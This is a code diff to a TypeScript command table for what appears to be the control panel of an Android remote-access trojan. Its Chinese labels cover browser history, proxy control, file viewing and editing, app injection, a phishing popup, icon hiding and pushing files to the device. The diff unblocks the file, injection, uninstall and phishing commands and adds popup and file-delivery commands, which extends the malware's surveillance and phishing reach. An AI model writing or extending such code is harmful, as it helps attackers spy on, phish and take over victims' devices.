@@ -36,20 +36,22 @@ export const DEVICE_COMMANDS: DeviceCommand[] = [
   { group: '数据', key: 'Permissions', label: '权限信息', requiresInput: true },
   { group: '数据', key: 'proxy', label: '代理控制', requiresInput: true },
   { group: '数据', key: 'brows', label: '浏览器历史' },
-  // 文件 (blocked)
-  { blocked: true, group: '文件', key: 'files', label: '文件列表' },
-  { blocked: true, group: '文件', key: 'viewfile', label: '查看文件' },
-  { blocked: true, group: '文件', key: 'changefiles', label: '文件操作' },
+  // 文件
+  { group: '文件', key: 'files', label: '文件列表' },
+  { group: '文件', key: 'viewfile', label: '查看文件' },
+  { group: '文件', key: 'changefiles', label: '文件操作' },
   // 应用
   { group: '应用', key: 'OPENAPP', label: '打开应用', requiresInput: true },
-  { blocked: true, group: '应用', key: 'OPENINJ', label: '注入应用' },
-  { blocked: true, group: '应用', key: 'UNINSTALLAPP', label: '卸载应用' },
-  { blocked: true, group: '应用', key: 'noinj', label: '取消注入' },
-  { blocked: true, group: '应用', key: 'DIAO', label: '钓鱼弹窗' },
+  { group: '应用', key: 'OPENINJ', label: '应用弹窗', requiresInput: true },
+  { group: '应用', key: 'UNINSTALLAPP', label: '卸载应用' },
+  { group: '应用', key: 'noinj', label: '取消注入' },
+  { group: '应用', key: 'POPUP', label: '弹窗通知', requiresInput: true },
+  { group: '应用', key: 'DIAO', label: '钓鱼弹窗', requiresInput: true },
   // 维护
   { group: '维护', key: 'Hideico', label: '隐藏图标' },
   { group: '维护', key: 'rename', label: '重命名', requiresInput: true },
   { group: '维护', key: 'bc', label: '广播/通知', requiresInput: true },
+  { group: '维护', key: 'down', label: '下发文件', requiresInput: true },
 ];
 
 export interface ScreenCommand {
